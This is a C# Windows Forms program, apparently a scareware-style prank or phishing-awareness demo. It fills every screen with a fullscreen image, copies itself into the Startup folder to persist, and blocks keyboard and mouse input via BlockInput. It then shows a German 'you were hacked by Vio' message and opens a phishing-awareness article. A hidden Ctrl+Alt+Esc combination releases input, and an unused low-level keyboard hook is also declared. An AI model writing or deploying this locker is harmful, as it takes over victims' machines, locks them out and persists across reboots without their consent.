using System;
using System.Diagnostics;
using System.Drawing; // Für Image-Unterstützung
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace FullscreenApp {
    public partial class Form1 : Form {
        // Importiert BlockInput, um die Tastatur und Maus zu sperren
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool fBlockIt);

        // Hook-Parameter
        private const int WH_KEYBOARD_LL = 13;
        private LowLevelKeyboardProc _proc;
        private IntPtr _hookID = IntPtr.Zero;

        string url = "https://support.beko-monheim.de/articles/JSD-A-58/Phishing"; // Ersetze dies durch deinen gewünschten Link

        public Form1() {
            ShowImageOnAllScreens();
            CopyToStartup(); // Methode zum Kopieren in den Autostart-Ordner
            InitializeComponent(); // Vom Designer generiert
            MessageBox.Show("Du würdest von Vio gehackt", "Achtung", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            Process.Start(new ProcessStartInfo("cmd", $"/c start {url}") { CreateNoWindow = true });
        }
        private void ShowImageOnAllScreens() {
            // Für jeden Bildschirm ein neues Fenster erstellen
            foreach (Screen screen in Screen.AllScreens) {               
                Form fullscreenForm = new Form {
                    BackgroundImage = FulscreenApp.Properties.Resources._3296364,
                    FormBorderStyle = FormBorderStyle.None,
                    WindowState = FormWindowState.Maximized,
                    BackgroundImageLayout = ImageLayout.Stretch,
                    StartPosition = FormStartPosition.Manual,
                    Location = screen.Bounds.Location, // Position des neuen Fensters auf dem Bildschirm
                    Size = screen.Bounds.Size, // Größe des Fensters entsprechend der Bildschirmgröße
                    ControlBox = false,
                    Cursor = System.Windows.Forms.Cursors.No,
                    MaximizeBox = false,
                    MinimizeBox = false,
                    ShowIcon = false,
                    ShowInTaskbar = false,
                    SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide                 
                };                
                fullscreenForm.Show();              
            }
        }

        private void CopyToStartup() {
            // Pfad zur ausführbaren Datei ermitteln
            string exePath = Application.ExecutablePath;
            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string targetPath = Path.Combine(startupFolder, Path.GetFileName(exePath));

            // Kopiert die Datei in den Autostart-Ordner, wenn sie noch nicht existiert
            if (!File.Exists(targetPath)) {
                File.Copy(exePath, targetPath);
            }
        }

        protected override void OnShown(EventArgs e) {
            base.OnShown(e);
            BlockInput(true); // Eingabegeräte sperren
        }

        protected override void OnFormClosed(FormClosedEventArgs e) {
            BlockInput(false); // Eingabegeräte entsperren
            base.OnFormClosed(e);
        }

        // Global Keyboard Hook
        private IntPtr SetHook(LowLevelKeyboardProc proc) {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            return (IntPtr)1; // Block the key press
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private void CloseAllForms() {
            foreach (var form in Application.OpenForms) {
                if (form is Form fullscreenForm) {
                    MessageBox.Show("Du würdest von Vio gehackt", "Achtung", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    fullscreenForm.Close();
                }
            }
        }

        //Ctrl + Alt + Esc Schliesst alles und rettet der Tag
        protected override bool ProcessCmdKey(ref Message msg, Keys keyData) {
            if (keyData == (Keys.Control | Keys.Alt | Keys.Escape)) {
                BlockInput(false);
                CloseAllForms();
            }
            return base.ProcessCmdKey(ref msg, keyData);
        }
    }
}
